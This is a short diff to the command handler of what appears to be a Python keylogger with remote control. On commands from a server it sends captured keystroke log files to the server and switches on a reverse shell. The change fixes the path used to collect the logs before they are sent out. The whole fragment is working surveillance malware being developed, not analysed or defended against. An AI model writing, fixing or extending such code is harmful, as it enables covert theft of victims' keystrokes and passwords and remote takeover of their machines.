@@ -294,7 +294,8 @@ if __name__ == "__main__":
                     keylogger.deactivate()
                     keylogger.send_message_to_server("logging deactivated")
                 elif recv == "send":
-                    files = [os.path.join("tmp", i) for i in os.listdir("tmp")]
+                    files = [os.path.join(keylogger.log_directory, i) for i in os.listdir(keylogger.log_directory)]
+                    print(files)
                     keylogger.send_files_to_server(files)
                 elif recv == "shell":
                     reverse_shell_active = True
